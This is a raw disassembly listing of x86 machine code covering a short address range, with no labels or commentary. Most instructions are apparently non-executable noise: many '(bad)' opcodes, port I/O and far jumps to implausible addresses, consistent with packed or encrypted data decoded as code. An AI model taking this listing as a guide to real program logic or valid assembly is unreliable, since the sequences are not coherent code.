  423dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dc9:	(bad)  
  423dca:	xor    edi,DWORD PTR ds:0xff0db0f
  423dd0:	and    eax,0x5e198c46
  423dd5:	pop    ebp
  423dd6:	mov    WORD PTR [esi],es
  423dd8:	dec    eax
  423dd9:	in     al,0x1b
  423ddb:	pop    esi
  423ddc:	retf   0x465
  423ddf:	mov    cl,0xd9
  423de1:	inc    esp
  423de2:	and    ebp,DWORD PTR [eax+0xd]
  423de5:	sti    
  423de6:	mov    cl,0xb8
  423de8:	retf   0x524c
  423deb:	out    dx,al
  423dec:	les    edi,FWORD PTR [ebx+ebp*2]
  423def:	or     al,0x90
  423df1:	fidiv  DWORD PTR [ebp-0x5f]
  423df4:	cli    
  423df5:	shl    bh,0x25
  423df8:	and    DWORD PTR [ecx-0x14],ecx
  423dfb:	loop   0x423de7
  423dfd:	xchg   esp,eax
  423dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dff:	and    ch,ch
  423e01:	push   esp
  423e02:	std    
  423e03:	mov    esp,0x11f8dd53
  423e08:	retf   0xd05e
  423e0b:	jne    0x423e3e
  423e0d:	xchg   edx,eax
  423e0e:	jo     0x423db0
  423e10:	jmp    0xa7c5bc5d
  423e15:	ror    DWORD PTR [edx-0x5f],1
  423e18:	in     eax,0x8
  423e1a:	xlat   BYTE PTR ds:[ebx]
  423e1b:	shr    BYTE PTR [ebx+edi*2-0x2],0xc
  423e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e21:	pop    ebp
  423e22:	ret    
  423e23:	gs or  al,0x25
  423e26:	xlat   BYTE PTR ds:[ebx]
  423e27:	(bad)  
  423e28:	repz cmp al,0x7a
  423e2b:	or     DWORD PTR [esi],eax
  423e2d:	and    al,0xd2
  423e2f:	mov    ecx,0xa7b0db1f
  423e34:	nop
  423e35:	repnz in eax,0x93
  423e38:	mov    eax,0xe4efa16a
  423e3d:	(bad)  
  423e3e:	mov    edi,0xb12e2eef
  423e43:	cli    
  423e44:	arpl   WORD PTR [ecx-0x1b],si
  423e47:	mov    cl,0xc5
  423e49:	push   es
  423e4a:	jmp    0xbd43:0xa8f83ce7
  423e51:	enter  0x815a,0xdd
  423e55:	test   eax,0x7bf6e22e
  423e5a:	mov    ah,0x53
  423e5c:	repz fdivrp st(7),st
  423e5f:	std    
  423e60:	mul    DWORD PTR [ebp+0x7f5ef17f]
  423e66:	(bad)  
  423e67:	and    ch,dl
  423e69:	in     eax,dx
  423e6a:	popa   
  423e6b:	cdq    
  423e6c:	push   ebx
  423e6d:	pop    ds
  423e6e:	mov    bh,bh
  423e70:	pop    esp
  423e71:	fsubr  QWORD PTR [ebx+0x2d]
  423e74:	cmp    ah,ah
  423e76:	aad    0x2a
  423e78:	ins    DWORD PTR es:[edi],dx
  423e79:	jnp    0x423e64
  423e7b:	ins    BYTE PTR es:[edi],dx
  423e7c:	pop    ebx
  423e7d:	inc    eax
  423e7e:	add    BYTE PTR [edi+0x5012a67a],al
  423e84:	out    dx,eax
  423e85:	enter  0xb40b,0x24
  423e89:	call   0x1d2b:0x8ab58a67
  423e90:	push   0xfffffffa
  423e92:	ins    BYTE PTR es:[edi],dx
  423e93:	pop    edi
  423e94:	xor    BYTE PTR [eax-0x57be00cc],dl
  423e9a:	repz push ecx
  423e9c:	popf   
  423e9d:	pop    edi
  423e9e:	cmc    
  423e9f:	dec    esi
  423ea0:	pop    ebp
  423ea1:	daa    
  423ea2:	pusha  
  423ea3:	sti    
  423ea4:	push   edi
  423ea5:	mov    ebx,0x1dda0354
  423eaa:	mul    BYTE PTR [eax]
  423eac:	fs cdq 
  423eae:	mov    esp,0x5734a6d
  423eb3:	mov    esp,0xf3399bf2
  423eb8:	sub    BYTE PTR [ecx+0x5ce9c398],dl
  423ebe:	push   esi
  423ebf:	sbb    BYTE PTR [edi-0x18],al
  423ec2:	ficomp WORD PTR [edx]
  423ec4:	ds jg  0x423eb7
  423ec7:	adc    esi,eax
  423ec9:	xor    al,0x9
  423ecb:	inc    esi
  423ecc:	test   cl,0x59
  423ecf:	and    dl,bl
  423ed1:	rcl    ecx,1
  423ed3:	pop    ecx
  423ed4:	sub    edx,edi
  423ed6:	test   al,ah
  423ed8:	addr16 (bad) 
  423eda:	stos   BYTE PTR es:[edi],al
  423edb:	inc    ecx
  423edc:	jmp    0xd1a6d642
  423ee1:	dec    ebp
  423ee2:	xor    BYTE PTR [edx],0xe9
  423ee5:	outs   dx,BYTE PTR ds:[esi]
  423ee6:	push   ebp
  423ee7:	inc    esp
  423ee8:	bound  ecx,QWORD PTR [esi-0x3c0eecc5]
  423eee:	pop    ecx
  423eef:	mov    dh,al
  423ef1:	stc    
  423ef2:	cmp    DWORD PTR [esi+0x6c],0xb4c01efa
  423ef9:	bound  ecx,QWORD PTR [edi-0x4e]
  423efc:	(bad)  
  423efd:	and    ch,BYTE PTR [edi+edi*1]
  423f00:	and    DWORD PTR [edi+0x32],0x70
  423f04:	add    al,0xf
  423f06:	iret   
  423f07:	retf   0xee5
  423f0a:	out    0x3d,eax
  423f0c:	add    cl,BYTE PTR [eax+0x71b3a276]
  423f12:	int    0x3b
  423f14:	ss xchg esp,eax
  423f16:	mov    al,0xa1
  423f18:	and    bl,BYTE PTR [ebx+0x6fc4a34b]
  423f1e:	jge    0x423ebd
  423f20:	ja     0x423f4f
  423f22:	inc    edx
  423f23:	sub    ebp,ebp
  423f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f26:	fisttp WORD PTR [edi-0x4ef6724b]
  423f2c:	or     eax,0x31e3c7a1
  423f31:	push   ss
  423f32:	sbb    dl,BYTE PTR [ecx+0x4502357b]
  423f38:	pop    ebx
  423f39:	shr    BYTE PTR [eax-0xbe6a96c],1
  423f3f:	mov    ch,0xae
  423f41:	mov    esi,0x45f5a77a
  423f46:	stos   BYTE PTR es:[edi],al
  423f47:	retf   
  423f48:	push   edx
  423f49:	lods   eax,DWORD PTR ds:[esi]
  423f4a:	adc    al,0xd7
  423f4c:	pop    esp
  423f4d:	pop    ebx
  423f4e:	(bad)  
	...
  423f58:	add    BYTE PTR [eax],al
  423f5a:	cmp    DWORD PTR [ecx+ecx*4],ebx
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x41e902b9
  423f67:	test   eax,0xb8d214f8
  423f6c:	add    DWORD PTR [eax],eax
  423f6e:	inc    BYTE PTR [ecx]
  423f70:	add    BYTE PTR [eax],al
  423f72:	(bad)  
  423f73:	adc    al,bh
  423f75:	and    al,0x4e
  423f77:	push   eax
  423f78:	inc    ecx
  423f79:	fild   QWORD PTR [eax+0x6f79a3af]
  423f7f:	pop    es
  423f80:	xor    BYTE PTR [ebp+0x73],dh
  423f83:	xlat   BYTE PTR ds:[ebx]
  423f84:	xchg   ebp,eax
  423f85:	push   ds
  423f86:	push   ebp
  423f87:	adc    BYTE PTR [eax-0x279ff7f9],cl
  423f8d:	pop    es
  423f8e:	and    al,0x9
  423f90:	pop    esp
  423f91:	dec    BYTE PTR [edi+edi*1-0xd]
  423f95:	fdivp  st(5),st
  423f97:	movzx  edi,WORD PTR [ebp-0x265011b9]
  423f9e:	inc    edx
  423f9f:	add    al,0x85
  423fa1:	outs   dx,DWORD PTR ds:[si]
  423fa3:	fcmovu st,st(2)
  423fa5:	pop    ecx
  423fa6:	sar    ch,0x4e
  423fa9:	mov    eax,ds:0x50767d85
  423fae:	mov    cl,0x86
  423fb0:	jle    0x423fbc
  423fb2:	loope  0x423f5f
  423fb4:	pop    ebp
  423fb5:	add    eax,DWORD PTR [ebx]
  423fb7:	push   ds
  423fb8:	inc    edi
  423fb9:	mov    ebx,0x64047290
  423fbe:	xlat   BYTE PTR ds:[ebx]
  423fbf:	xchg   BYTE PTR [ebx],cl
  423fc1:	push   ecx
  423fc2:	std    
  423fc3:	cmp    BYTE PTR [edx+0x48],ch
  423fc6:	xchg   ebp,eax
  423fc7:	int3   
  423fc8:	sub    al,0xd8
  423fca:	sub    edx,DWORD PTR [ecx]
  423fcc:	mov    esp,0x13da6de6
  423fd1:	jb     0x423fc1
  423fd3:	cmp    ch,BYTE PTR [edx]
  423fd5:	push   es
  423fd6:	xor    dh,ch
  423fd8:	mov    edx,0x574d5638
  423fdd:	popa   
  423fde:	nop
  423fdf:	xchg   ecx,eax
  423fe0:	mov    eax,ds:0xd3c9e62
  423fe5:	mov    cl,0xbb
  423fe7:	test   al,0xb5
  423fe9:	pop    ebx
  423fea:	mov    bl,0x96
  423fec:	pop    eax
  423fed:	gs adc al,0x46
  423ff0:	shr    edi,1
  423ff2:	pop    ss
  423ff3:	fwait
  423ff4:	js     0x423fa5
  423ff6:	adc    al,0x1
  423ff8:	jecxz  0x423fdc
  423ffa:	xchg   ecx,eax
  423ffb:	mov    esi,0x59d9ba1a
  424000:	repnz (bad) [ecx-0x3a1b94bc]
  424007:	inc    eax
  424008:	mov    ds:0x250ebfd7,al
  42400d:	bound  edi,QWORD PTR [ebx+0x69]
  424010:	xchg   esp,eax
  424011:	inc    edx
  424012:	loop   0x424056
  424014:	retf   0xe6b9
  424017:	and    DWORD PTR [ebp-0x16],0x61d25f0e
  42401e:	xlat   BYTE PTR ds:[ebx]
  42401f:	add    al,0x15
  424021:	pop    esi
  424022:	xor    al,0x40
  424024:	mov    ebp,0xbca313b3
  424029:	mov    ds:0x176c0ebc,eax
  42402e:	cdq    
  42402f:	std    
  424030:	mov    dh,0xbf
  424032:	popf   
  424033:	mov    ah,ah
  424035:	and    al,0xf7
  424037:	pusha  
  424038:	inc    edx
  424039:	das    
  42403a:	cmp    eax,0x39321faf
  42403f:	adc    bl,BYTE PTR [esi+ebp*2-0xcf19613]
  424046:	retf   
  424047:	arpl   WORD PTR [ebx-0x5c0d9b84],bp
  42404d:	dec    ecx
  42404e:	stc    
  42404f:	or     eax,0x742e3199
  424054:	and    DWORD PTR [esi+0x4d879875],edi
  42405a:	inc    esi
  42405b:	rcr    bl,1
  42405d:	outs   dx,DWORD PTR ds:[esi]
  42405e:	mov    dl,BYTE PTR [esi-0x4f]
  424061:	stc    
  424062:	frstor [edx]
  424064:	jmp    0x424097
  424066:	lahf   
  424067:	add    ah,bh
  424069:	fcomp  DWORD PTR [eiz*2-0x262a523f]
  424070:	aam    0xdb
  424072:	pop    eax
  424073:	fwait
  424074:	stc    
  424075:	adc    al,0xfc
  424077:	mov    eax,ds:0xe6fb0e82
  42407c:	(bad)  
  42407d:	(bad)  
  42407e:	xchg   esi,eax
  42407f:	jns    0x424008
  424081:	mov    ebx,0x84483e96
  424086:	clc    
  424087:	hlt    
  424088:	inc    edi
  424089:	leave  
  42408a:	sbb    DWORD PTR [esi-0x51],edi
  42408d:	cmp    BYTE PTR [edi],ch
  42408f:	call   0xd46b0c03
  424094:	ins    BYTE PTR es:[edi],dx
  424095:	push   es
  424096:	dec    ebx
  424097:	dec    ebx
  424098:	xor    eax,0xb862e373
  42409d:	ret    0x64f5
  4240a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240a1:	inc    ebp
  4240a2:	inc    edx
  4240a3:	cmp    al,BYTE PTR [edx]
  4240a5:	mov    ebp,0x4f58debb
  4240aa:	fs ds cmp al,0xfe
  4240ae:	mov    DWORD PTR [edi+0x0],esi
  4240b1:	adc    al,0xba
  4240b3:	adc    eax,0x1909f74b
  4240b8:	jo     0x424097
  4240ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240bb:	test   al,0x39
  4240bd:	dec    ebx
  4240be:	xchg   ebp,eax
  4240c0:	ss add eax,0x72ffff1a
  4240c6:	outs   dx,BYTE PTR ds:[si]
  4240c8:	adc    dh,BYTE PTR [edi]
  4240ca:	ja     0x424066
  4240cc:	dec    ebx
  4240cd:	aam    0x65
  4240cf:	mov    bl,0x18
  4240d1:	inc    ebp
  4240d2:	adc    bl,BYTE PTR [edi]
  4240d4:	sbb    DWORD PTR [esi],ebx
  4240d6:	pop    eax
  4240d7:	lock cmp al,BYTE PTR [eax-0x31000ab7]
  4240de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240df:	dec    ecx
  4240e0:	dec    ecx
  4240e1:	in     eax,dx
  4240e2:	cmc    
  4240e3:	xchg   cl,al
  4240e5:	ss push 0x34d032b6
  4240eb:	add    eax,0x288d5131
  4240f0:	mov    cs,eax
  4240f2:	iret   
  4240f3:	lock sahf 
  4240f5:	xor    esp,edi
  4240f7:	mov    dl,bh
  4240f9:	and    al,BYTE PTR [eax-0x5b]
  4240fc:	sbb    DWORD PTR [esi],ebx
  4240fe:	jmp    0x4240c2
  424100:	or     al,0xb0
  424102:	pushf  
  424103:	add    eax,0x5f565165
  424108:	out    0x25,eax
  42410a:	adc    BYTE PTR ss:[eax-0x2b10b93b],0x3d
  424112:	mov    bl,0xd1
  424114:	test   al,0xa7
  424116:	outs   dx,BYTE PTR ds:[esi]
  424117:	daa    
  424118:	xor    ebx,DWORD PTR [ebp+0x2dc81af8]
  42411e:	mov    WORD PTR [esi-0x5c995202],?
  424124:	aas    
  424125:	rol    BYTE PTR [ebp+0x15],cl
  424128:	lds    esi,FWORD PTR [ebx+0x20c85d73]
  42412e:	sub    BYTE PTR [edx+0x3e],dl
  424131:	fldcw  WORD PTR [edx-0x3b]
  424134:	or     ebp,DWORD PTR [ecx]
  424136:	xchg   edi,eax
  424137:	je     0x424155
  424139:	push   ss
  42413a:	nop
  42413b:	push   ebx
  42413c:	xor    BYTE PTR ds:0xa1b4e03d,bh
  424142:	add    edx,DWORD PTR [eax]
  424144:	adc    eax,0x7ebe4625
  424149:	scas   al,BYTE PTR es:[edi]
  42414a:	xor    al,0xab
  42414c:	mov    ds:0x8f5fd5cf,al
  424152:	xchg   esp,eax
  424153:	pushf  
  424154:	pop    ds
  424155:	add    cl,0x92
  424158:	es sbb ebx,0x13a74828
  42415f:	inc    ebp
  424160:	fbstp  TBYTE PTR [eax]
  424162:	mov    ebx,0x8f210e11
  424167:	aad    0xb3
  424169:	sub    BYTE PTR ds:0x439588a7,0xdd
	...
  424178:	add    BYTE PTR [eax],al
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	je     0x4241c6
  424188:	fbstp  TBYTE PTR [eax+0x1bad0]
  42418e:	inc    BYTE PTR [ecx]
  424190:	add    BYTE PTR [eax],al
  424192:	jo     0x424123
  424194:	jbe    0x42413b
  424196:	mul    DWORD PTR ds:0xef6ec900
  42419c:	inc    esp
  42419d:	adc    BYTE PTR [ecx-0x493a478c],bh
  4241a3:	adc    ecx,esi
  4241a5:	dec    ebx
  4241a6:	sbb    al,0xee
  4241a8:	cmc    
  4241a9:	(bad)  
  4241aa:	fsub   DWORD PTR [ebx]
  4241ac:	xchg   ecx,eax
  4241ad:	mov    edi,0x49d93d11
  4241b2:	rcr    DWORD PTR [esi-0x25],1
  4241b5:	das    
  4241b6:	xchg   esp,eax
  4241b7:	je     0x4241ac
  4241b9:	fsub   QWORD PTR [edx]
  4241bb:	add    edi,0xfffffffa
  4241be:	pop    DWORD PTR [ebp+0x78aacf9]
  4241c4:	jne    0x4241d0
  4241c6:	jl     0x42417a
  4241c8:	inc    ebx
  4241c9:	fdivrp st(3),st
  4241cb:	pop    esi
  4241cc:	add    bl,BYTE PTR [esi+0x3b01c871]
  4241d2:	ja     0x42416b
  4241d4:	lock dec esp
  4241d6:	lahf   
  4241d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241d8:	sbb    al,0x78
  4241da:	adc    al,0xac
  4241dc:	aam    0x7e
  4241de:	outs   dx,BYTE PTR ds:[esi]
  4241df:	push   ecx
  4241e0:	and    cl,cl
  4241e2:	aaa    
  4241e3:	xchg   edi,eax
  4241e4:	push   es
  4241e5:	cmp    BYTE PTR [eax-0x59],al
  4241e8:	sbb    ebx,DWORD PTR [edi+0x6eff9da]
  4241ee:	or     al,0x75
  4241f0:	cdq    
  4241f1:	(bad)  
  4241f2:	repz add DWORD PTR [ecx-0x66],edi
  4241f6:	jbe    0x424221
  4241f8:	mov    al,0xeb
  4241fa:	test   al,0x95
  4241fc:	test   DWORD PTR [esi],esp
  4241fe:	jne    0x4241ff
  424200:	mov    ds:0x2518dc5e,al
  424205:	push   ss
  424206:	iret   
  424207:	arpl   WORD PTR [edx],bp
  424209:	inc    esi
  42420a:	das    
  42420b:	push   ebp
  42420c:	repnz push esp
  42420e:	xor    eax,0x8ccb1912
  424213:	pop    edi
  424214:	ret    
  424215:	shl    BYTE PTR [edi+eax*4],1
  424218:	cmp    ah,dh
  42421a:	outs   dx,DWORD PTR ds:[esi]
  42421b:	les    ecx,FWORD PTR ds:0x9a7f4695
  424221:	stos   DWORD PTR es:[edi],eax
  424222:	out    0x14,al
  424224:	pop    ebx
  424225:	jg     0x4241eb
  424227:	dec    ecx
  424228:	fs cs fcmovne st,st(3)
  42422c:	and    esi,DWORD PTR [esi-0x32e421b1]
  424232:	sub    al,0x79
  424234:	xchg   edi,eax
  424235:	mov    ds:0x72bb1d26,al
  42423a:	add    eax,0xaf1c9e67
  42423f:	jmp    0x346d:0xaf75686
  424246:	dec    edx
  424247:	sub    bh,BYTE PTR [edx+0x77]
  42424a:	popa   
  42424b:	jbe    0x4242c2
  42424d:	jl     0x424288
  42424f:	inc    eax
  424250:	pop    esi
  424251:	mov    ds,WORD PTR [ecx+eiz*2-0x31]
  424255:	rcr    BYTE PTR [edx-0x40],cl
  424258:	xchg   ecx,eax
  424259:	nop
  42425a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42425b:	mov    ds:0xa49d1e38,al
  424260:	push   cs
  424261:	push   ss
  424262:	adc    DWORD PTR [eax],ebx
  424264:	adc    ecx,esp
  424266:	(bad)  [esi+0x3e]
  424269:	mov    ah,0x24
  42426b:	mov    bh,0x92
  42426d:	push   esp
  42426e:	dec    eax
  42426f:	add    BYTE PTR [edx-0xd],ch
  424272:	addr16 loopne 0x424289
  424275:	aaa    
  424276:	sbb    eax,ebp
  424278:	stc    
  424279:	jb     0x4242c4
  42427b:	ror    BYTE PTR [edx+edi*8-0x80751dd],cl
  424282:	push   ebp
  424283:	int    0x58
  424285:	dec    di
  424287:	fsub   DWORD PTR [esi-0x47]
  42428a:	in     al,0xae
  42428c:	add    edi,DWORD PTR [edx+0x1c094c71]
  424292:	xor    DWORD PTR [edi-0x6abf01de],esi
  424298:	add    BYTE PTR [eax],cl
  42429a:	inc    ebx
  42429b:	(bad)  
  42429d:	add    al,0x2f
  42429f:	adc    BYTE PTR [esi],al
  4242a1:	and    DWORD PTR [esi+0x0],ebx
  4242a4:	adc    edi,DWORD PTR [edi-0x43]
  4242a7:	and    ah,BYTE PTR [edi+esi*4]
  4242aa:	mov    eax,0x8cc0417b
  4242af:	lahf   
  4242b0:	data16 mov ds:0xc6bc70f2,al
  4242b6:	nop
  4242b7:	mov    al,0xc7
  4242b9:	aaa    
  4242ba:	add    bl,ah
  4242bc:	xlat   BYTE PTR ds:[ebx]
  4242bd:	sub    ebp,DWORD PTR [esi]
  4242bf:	outs   dx,DWORD PTR ds:[esi]
  4242c0:	jge    0x4242f1
  4242c2:	test   BYTE PTR [edi-0x58496c61],dh
  4242c8:	or     ah,al
  4242ca:	xchg   esi,eax
  4242cb:	mov    bl,0x84
  4242cd:	sub    BYTE PTR [ebx+0x34],al
  4242d0:	or     eax,0x403a48da
  4242d5:	scas   eax,DWORD PTR es:[edi]
  4242d6:	push   cs
  4242d7:	dec    DWORD PTR [ecx-0x2e0e9c1a]
  4242dd:	xor    DWORD PTR [edx+0x4a],esp
  4242e0:	and    al,0x28
  4242e2:	cmp    bl,BYTE PTR [ebp+0x5e]
  4242e5:	mov    bl,0xf4
  4242e7:	in     eax,0x5f
  4242e9:	or     dh,ah
  4242eb:	arpl   bp,si
  4242ed:	js     0xd7892d1
  4242f3:	or     edi,DWORD PTR [eax]
  4242f5:	cdq    
  4242f6:	add    eax,0x4a6bee2b
  4242fb:	sbb    BYTE PTR [ebp+0x7c],ch
  4242fe:	pop    eax
  4242ff:	push   ebx
  424300:	xor    dh,bh
  424302:	sub    ecx,DWORD PTR ds:[edi+0x58]
  424306:	retf   
  424307:	jle    0x4242b6
  424309:	sbb    bh,ah
  42430b:	loop   0x4242ce
  42430d:	mov    BYTE PTR [edx-0x7469d8e0],al
  424313:	dec    edi
  424314:	cvtps2pi mm4,QWORD PTR [esi-0x7e]
  424318:	retf   
  424319:	inc    esi
  42431a:	push   cs
  42431b:	mov    DWORD PTR [esi],edi
  42431d:	in     al,0xc3
  42431f:	cwde   
  424320:	sbb    BYTE PTR [ecx],dl
  424322:	out    dx,al
  424323:	jno    0x424328
  424325:	ins    BYTE PTR es:[edi],dx
  424326:	pop    es
  424327:	ss xor esp,DWORD PTR gs:[ecx+0x49]
  42432c:	or     bl,0x8a
  42432f:	aad    0x4b
  424331:	loop   0x424357
  424333:	fisttp WORD PTR [ebx-0x6e]
  424336:	les    esi,FWORD PTR [esi+eiz*4-0x68]
  42433a:	adc    ecx,ebp
  42433c:	pop    eax
  42433d:	jnp    0x4242ee
  42433f:	loop   0x4242ee
  424341:	mov    esp,edx
  424343:	pop    es
  424344:	jns    0x4242d8
  424346:	mov    bh,0x18
  424348:	pop    esi
  424349:	lock dec ebx
  42434b:	cmc    
  42434c:	xchg   esp,eax
  42434d:	in     eax,dx
  42434e:	add    BYTE PTR [ebx],0x5a
  424351:	call   0x164b:0x240935af
  424358:	pop    esp
  424359:	fsub   DWORD PTR [esi+0x2c]
  42435c:	push   ds
  42435d:	aas    
  42435e:	test   BYTE PTR [esi-0x47],dh
  424361:	mov    dh,0xe0
  424363:	cld    
  424364:	push   ecx
  424365:	and    bh,BYTE PTR [ecx]
  424367:	mov    sp,si
  42436a:	push   0xffffffc7
  42436c:	pop    esi
  42436d:	ror    ebx,cl
  42436f:	xchg   ecx,eax
  424370:	mov    dh,0x69
  424372:	pushf  
  424373:	nop
  424374:	jle    0x424370
  424376:	pop    ebp
  424377:	addr16 dec ecx
  424379:	and    BYTE PTR [esi],al
  42437b:	cs jge 0x42436b
  42437e:	inc    ecx
  42437f:	fisub  DWORD PTR [edx+ebp*1+0x1b]
  424383:	aaa    
  424384:	push   ds
  424385:	mov    al,0x5
  424387:	shl    BYTE PTR ds:0xf94a9f78,cl
  42438d:	imul   esp,esi,0xf7
  424393:	add    BYTE PTR [eax],al
  424395:	add    BYTE PTR [eax],al
  424397:	add    BYTE PTR [eax],al
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	cli    
  4243a7:	xchg   esp,eax
  4243a8:	sub    BYTE PTR [esi+ecx*8-0x1fffe44],al
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    BYTE PTR [ebx],dl
  4243b3:	mov    esp,0xb90cae15
  4243b8:	and    BYTE PTR [edi],cl
  4243ba:	(bad)  [edx+eiz*1]
  4243bd:	loop   0x42439c
  4243bf:	pavgb  mm4,mm7
  4243c2:	call   0x90b1a25f
  4243c7:	pop    eax
  4243c8:	stc    
  4243c9:	out    dx,eax
  4243ca:	jnp    0x4243d0
  4243cc:	cwde   
  4243cd:	xor    BYTE PTR [ebp+0x76],0xc6
  4243d1:	ss jmp 0x262b34e9
  4243d7:	push   cs
  4243d8:	push   ecx
  4243d9:	cmp    DWORD PTR [ebx+0x78a23a03],esi
  4243df:	and    al,BYTE PTR [esi+0x4c1d6a54]
  4243e5:	mov    edi,0xdcdde2f1
  4243ea:	xor    eax,0x909807f2
  4243ef:	mov    ds:0x522e414c,eax
  4243f4:	dec    esi
  4243f5:	xor    DWORD PTR [edi+0x1c],ebp
  4243f8:	inc    ecx
  4243f9:	jp     0x424423
  4243fb:	inc    esp
  4243fc:	je     0x4243a6
  4243fe:	je     0x424392
  424400:	(bad)  
  424402:	in     al,0x1e
  424404:	aam    0xa2
  424406:	cmp    edi,DWORD PTR [ecx-0x52]
  424409:	jo     0x424452
  42440b:	sti    
  42440c:	sbb    edx,DWORD PTR [ebx+0x7431d26b]
  424412:	pop    ss
  424413:	cmp    bh,BYTE PTR [esi+0xb9e1589]
  424419:	outs   dx,BYTE PTR ds:[esi]
  42441a:	jmp    0x8f1a6f22
  42441f:	jmp    0xa1f9773e
  424424:	clc    
  424425:	popf   
  424426:	adc    al,0x15
  424428:	mov    BYTE PTR ds:0x761c39ba,bl
  42442e:	in     eax,0x94
  424430:	inc    edi
  424431:	out    0x9b,eax
  424433:	data16 ror BYTE PTR [esi],cl
  424436:	ror    DWORD PTR [edi],cl
  424438:	dec    esi
  424439:	cmp    ah,BYTE PTR [ebx]
  42443b:	cdq    
  42443c:	jg     0x42444a
  42443e:	js     0x424422
  424440:	mov    eax,ds:0x72374a65
  424445:	loop   0x42449a
  424447:	pop    ecx
  424448:	push   ds
  424449:	fcomp  DWORD PTR [esi]
  42444b:	xchg   ecx,eax
  42444c:	lahf   
  42444d:	lock and BYTE PTR [ebx+0xbfcaac8],dl
  424454:	sub    eax,0x32e68233
  424459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42445a:	stc    
  42445b:	scas   al,BYTE PTR es:[edi]
  42445c:	arpl   WORD PTR [edx-0x4],cx
  42445f:	lods   eax,DWORD PTR ds:[esi]
  424460:	data16 outs dx,BYTE PTR ds:[esi]
  424462:	xchg   BYTE PTR [edi+0x22],ch
  424465:	enter  0xa18d,0x94
  424469:	loopne 0x424499
  42446b:	dec    ebx
  42446c:	mov    WORD PTR [esi-0x434dd064],fs
  424472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424473:	jbe    0x4244dc
  424475:	iret   
  424476:	xchg   ebx,eax
  424477:	pop    ecx
  424478:	push   ds
  424479:	sub    edi,DWORD PTR [ecx]
  42447b:	mov    BYTE PTR [ebp-0x2633e492],dh
  424481:	sub    ch,BYTE PTR [ecx+0x78]
  424484:	icebp  
  424485:	enter  0x9fcb,0x70
  424489:	inc    eax
  42448a:	imul   edi
  42448c:	pop    edx
  42448d:	and    ch,BYTE PTR [edx-0x4645143d]
  424493:	push   ebx
  424494:	mov    bh,0x1
  424496:	(bad)  
  424498:	(bad)  
  424499:	stos   DWORD PTR es:[edi],eax
  42449a:	in     al,dx
  42449b:	les    ebx,FWORD PTR [edi-0x1b1d7b0d]
  4244a1:	mov    ebp,0xf4347c23
  4244a6:	inc    esi
  4244a7:	arpl   WORD PTR [ecx+0x77],dx
  4244aa:	cs jle 0x42446c
  4244ad:	pop    es
  4244ae:	test   eax,0x4ec49d0a
  4244b3:	mov    ebp,0x953cd22f
  4244b8:	jno    0x424526
  4244ba:	jns    0x4244d4
  4244bc:	rcl    BYTE PTR [eax+0x9],1
  4244bf:	shr    DWORD PTR [edx+0x9],cl
  4244c2:	int    0xb
  4244c4:	not    BYTE PTR [ebp-0x664a4525]
  4244ca:	pop    ebx
  4244cb:	pop    esi
  4244cc:	test   cl,bh
  4244ce:	gs hlt 
  4244d0:	xor    edi,DWORD PTR [esi+ebx*8+0x6dd1fa64]
  4244d7:	pushf  
  4244d8:	jge    0x424488
  4244da:	sbb    ecx,ebp
  4244dc:	sub    eax,0x52d3d016
  4244e1:	push   esi
  4244e2:	xchg   esi,eax
  4244e3:	shl    bh,1
  4244e5:	lods   eax,DWORD PTR ds:[esi]
  4244e6:	mov    al,ds:0x4c0d52df
  4244eb:	mov    dl,bh
  4244ed:	jecxz  0x424493
  4244ef:	jnp    0x42450b
  4244f1:	pop    edx
  4244f2:	imul   edx,DWORD PTR [eax],0xa8d0d893
  4244f8:	sahf   
  4244f9:	int3   
  4244fa:	mov    bh,0xe8
  4244fc:	(bad)  
  4244fd:	call   0xe4e9874
  424502:	(bad)  
  424503:	daa    
  424504:	les    edx,FWORD PTR [edi]
  424506:	(bad)
  424509:	adc    ah,dh
  42450b:	repz mov ah,0x9
  42450e:	jns    0x4244ed
  424510:	shl    DWORD PTR [eax],cl
  424512:	aaa    
  424513:	out    0x5d,eax
  424515:	pop    es
  424516:	push   edi
  424517:	lock adc esi,DWORD PTR ds:0xee9c97c4
  42451e:	loope  0x424542
  424520:	dec    ebx
  424521:	dec    ebx
  424522:	lock or BYTE PTR [eax+0x75],ah
  424526:	mov    ebp,0x4369d666
  42452b:	and    bh,BYTE PTR [ebx]
  42452d:	push   0xffffffc7
  42452f:	(bad)  
  424530:	into   
  424531:	mov    edx,DWORD PTR [eax-0x70a08a86]
  424537:	mov    esp,0xae3b4780
  42453c:	xchg   ebx,eax
  42453d:	pop    edx
  42453e:	pop    esp
  42453f:	inc    edx
  424540:	enter  0x818c,0x9d
  424544:	or     al,BYTE PTR [ebx+0x51]
  424547:	push   ss
  424548:	retf   0x13fe
  42454b:	test   al,0xd0
  42454e:	call   0x6305:0xda242e67
  424555:	aam    0xf7
  424557:	pop    es
  424558:	fisttp DWORD PTR [bp+di]
  42455b:	sbb    BYTE PTR [edx],dl
  42455d:	mov    al,ds:0x5721ae3b
  424562:	pop    eax
  424563:	and    al,0x3a
  424565:	sbb    DWORD PTR [esp],ebp
  424568:	icebp  
  424569:	pop    ss
  42456a:	loope  0x424535
  42456c:	jns    0x424550
  42456e:	mov    edx,0x9873c2db
  424573:	adc    BYTE PTR [edx],al
  424575:	sub    DWORD PTR [ebp+0x53],ebx
  424578:	in     eax,dx
